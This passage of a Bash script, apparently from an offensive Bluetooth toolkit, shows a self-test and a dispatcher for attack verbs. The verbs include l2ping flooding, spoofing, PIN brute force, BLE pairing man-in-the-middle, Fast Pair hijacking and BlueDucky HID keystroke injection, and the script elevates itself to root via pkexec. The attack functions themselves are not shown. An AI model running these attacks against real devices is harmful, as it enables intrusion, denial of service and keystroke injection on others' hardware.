    chk needs-root-pin      "$(bt_attack_needs_root --pin-brute; echo $?)"     "0"
    chk needs-root-status   "$(bt_attack_needs_root --status-tsv; echo $?)"    "1"
    chk needs-root-pairtsv  "$(bt_attack_needs_root --pair-tsv; echo $?)"      "1"
    chk needs-root-selftest "$(bt_attack_needs_root --selftest; echo $?)"      "1"

    # ── offensive CVE verbs ──────────────────────────────────────────
    # Prerequisite reporting must answer on any machine, including one
    # with no adapter and no Node.
    out=$(bt_attack_fastpair_prereqs_tsv)
    chk fastpair-prereqs-verdict "$(fld "$out" verdict | grep -c .)" "1"
    chk fastpair-prereqs-fields  "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk fastpair-prereqs-node    "$(fld "$out" node | grep -cE '^(yes|no)$')" "1"

    out=$(bt_attack_hid_prereqs_tsv)
    chk hid-prereqs-verdict "$(fld "$out" verdict | grep -c .)" "1"
    chk hid-prereqs-fields  "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk hid-prereqs-bdaddr  "$(fld "$out" bdaddr | grep -cE '^(yes|no)$')" "1"

    # A bad platform must be a usage error, not a silent default. The
    # check happens before any adapter or root requirement, so this is
    # safe to assert without hardware.
    bt_attack_cli_hid_inject blackberry >/dev/null 2>&1
    chk hid-rejects-platform "$?" "2"

    # With no PoC present the verb must say so rather than pretending to
    # run something.
    out=$(BT_ATTACK_LOOT="$d/nothing" bt_attack_cli_hid_inject android 2>&1 || true)
    grep -qE 'BlueDucky not present|bdaddr is missing|pybluez is missing|no bluetooth interface' <<<"$out" \
        && chk hid-errors-without-poc ok ok || chk hid-errors-without-poc no ok

    out=$(BT_ATTACK_LOOT="$d/nothing" bt_attack_cli_fastpair_hijack 5 2>&1 || true)
    grep -qE 'not present|node is not installed|no bluetooth interface' <<<"$out" \
        && chk fastpair-errors-without-toolkit ok ok || chk fastpair-errors-without-toolkit no ok

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

bt_attack_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift

    if bt_attack_needs_root "$cmd" && \
       [ "$(id -u)" != "0" ] && \
       [ -z "${WIFISTING_ELEVATED:-}" ]; then
        exec pkexec "$(readlink -f "$0")" "$cmd" "$@"
    fi

    case "$cmd" in
        --status-tsv)       bt_attack_cli_status_tsv ;;
        --set-target)       bt_attack_cli_set_target "$@" ;;
        --l2ping-flood)     bt_attack_cli_l2ping_flood "$@" ;;
        --spoof)            bt_attack_cli_spoof "$@" ;;
        --rfcomm)           bt_attack_cli_rfcomm "$@" ;;
        --rfcomm-release)   bt_attack_cli_rfcomm_release "$@" ;;
        --pin-brute)        bt_attack_cli_pin_brute "$@" ;;
        --ble-pair-mitm)    bt_attack_cli_ble_pair_mitm "$@" ;;
        --pair-tsv)         bt_attack_pair_tsv ;;
        --pair-mode)        bt_attack_cli_pair_mode "$@" ;;
        --fastpair-hijack) bt_attack_cli_fastpair_hijack "$@" ;;
        --hid-inject)      bt_attack_cli_hid_inject "$@" ;;
        --selftest)         bt_attack_selftest ;;
        --info|--help|-h)   bt_attack_cli_info ;;
        *)
            bt_attack_cli_info >&2
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    bt_attack_cli_main "$@"
fi
